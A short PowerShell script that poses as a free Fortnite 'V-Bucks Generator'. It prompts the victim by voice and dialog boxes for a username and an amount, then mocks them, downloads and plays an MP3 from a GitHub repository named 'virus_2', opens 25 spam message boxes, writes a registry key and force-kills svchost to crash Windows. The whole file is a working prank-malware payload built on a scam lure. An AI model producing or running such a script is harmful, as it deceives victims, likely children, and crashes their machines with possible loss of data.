# Load necessary libraries
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName Microsoft.VisualBasic
$voice = New-Object System.Speech.Synthesis.SpeechSynthesizer

# 1. Username Phase
$voice.Speak("hello user you want vbucks right just type your username in the message box and then click enter")
[Microsoft.VisualBasic.Interaction]::InputBox("Enter Username:", "V-Bucks Generator", "")

# 2. Amount Phase
$voice.Speak("how much vbucks do you want?")
[Microsoft.VisualBasic.Interaction]::InputBox("Enter Amount:", "V-Bucks Generator", "13500")

# 3. The Reveal
$voice.Speak("you been fooled")

# 4. Download and Play your MP3
$mp3Url = "https://github.com/DanielNov2014/virus_2/raw/refs/heads/main/resources/you-been-trolled.mp3"
$mp3Path = "$env:TEMP\troll.mp3"
curl -L -s -o $mp3Path $mp3Url

$player = New-Object -ComObject WMPlayer.OCX
$player.URL = $mp3Path
$player.settings.volume = 100
$player.controls.play()

# Wait for the music (adjust seconds to match the mp3 length)
Start-Sleep -Seconds 15

# 5. Spam Message Boxes
for ($i = 0; $i -lt 25; $i++) {
    start-process powershell -ArgumentList "-Command [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('YOU BEEN TROLLED', 'LOL')"
}

Start-Sleep -Seconds 2

# 6. Final Stage & BSOD
$Key = "HKCU:\Software\Freevbucks"
Set-ItemProperty -Path $Key -Name "Stage" -Value 3
stop-process -name svchost -force
